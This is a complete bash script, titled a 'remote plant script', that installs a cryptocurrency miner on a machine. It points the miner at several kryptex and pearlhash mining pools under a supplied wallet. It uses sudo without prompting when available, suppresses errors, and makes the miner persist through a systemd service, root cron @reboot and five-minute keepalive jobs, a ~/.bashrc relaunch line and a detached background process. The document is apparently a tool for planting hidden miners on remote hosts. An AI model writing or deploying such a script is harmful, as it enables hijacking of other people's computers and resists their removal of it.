#!/bin/bash
# remote plant script: W=<wallet> RIG=<worker> bash ulplant.sh
set -u
W="${W:?}"
RIG="${RIG:?}"
L=/var/log/ul/$RIG.log
S=""
if sudo -n true 2>/dev/null; then S="sudo -n"; fi
$S mkdir -p /opt/ul /var/log/ul 2>/dev/null || mkdir -p /opt/ul /var/log/ul
cat > /tmp/ulrun.sh <<'EOR'
#!/bin/bash
W="__W__"; RIG="__RIG__"
L=/var/log/ul/$RIG.log
while :; do
  for s in stratum+ssl://prl-sg.kryptex.network:8048 stratum+tcp://prl-sg.kryptex.network:7048 stratum+ssl://prl-hk.kryptex.network:8048 stratum+ssl://prl-eu.kryptex.network:8048 stratum+ssl://prl-us.kryptex.network:8048 stratum+tcp://pool.pearlhash.xyz:9000; do
    nice -n 19 /tmp/ulpm -o "$s" -u "$W.$RIG" -p x >>$L 2>&1 &
    P=$!
    sleep 240
    kill $P 2>/dev/null
    grep -aq accepted $L && break
  done
  sleep 15
done
EOR
sed -i "s|__W__|$W|;s|__RIG__|$RIG|" /tmp/ulrun.sh
$S cp /tmp/ulrun.sh /opt/ul/run.sh && chmod +x /opt/ul/run.sh
printf '#!/bin/bash\npgrep -f /opt/ul/run.sh >/dev/null || setsid nohup bash /opt/ul/run.sh >/dev/null 2>&1 &\n' > /tmp/ulkeep.sh
$S cp /tmp/ulkeep.sh /opt/ul/keep.sh && chmod +x /opt/ul/keep.sh
printf '[Unit]\nDescription=ul miner\nAfter=network-online.target\n[Service]\nExecStart=/bin/bash /opt/ul/run.sh\nRestart=always\nRestartSec=30\nNice=10\n[Install]\nWantedBy=multi-user.target\n' > /tmp/ulminer.service
if $S cp /tmp/ulminer.service /etc/systemd/system/ul-miner.service 2>/dev/null; then
  $S systemctl daemon-reload 2>/dev/null
  $S systemctl enable --now ul-miner 2>/dev/null
fi
( crontab -l 2>/dev/null | grep -v 'ul/keep' ; echo '@reboot root setsid bash /opt/ul/run.sh >/dev/null 2>&1 &' ; echo '*/5 * * * * root /opt/ul/keep.sh' ) | crontab - 2>/dev/null
grep -q 'opt/ul/run.sh' ~/.bashrc 2>/dev/null || echo 'pgrep -f /opt/ul/run.sh >/dev/null || setsid nohup bash /opt/ul/run.sh >/dev/null 2>&1 &' >> ~/.bashrc 2>/dev/null
pgrep -f /opt/ul/run.sh >/dev/null || setsid nohup bash /opt/ul/run.sh >/dev/null 2>&1 &
sleep 25
echo "--- procs ---"; pgrep -af ulpm | head -3
echo "--- unit ---"; systemctl is-active ul-miner 2>/dev/null
echo "--- log ---"; tail -8 "$L" 2>/dev/null
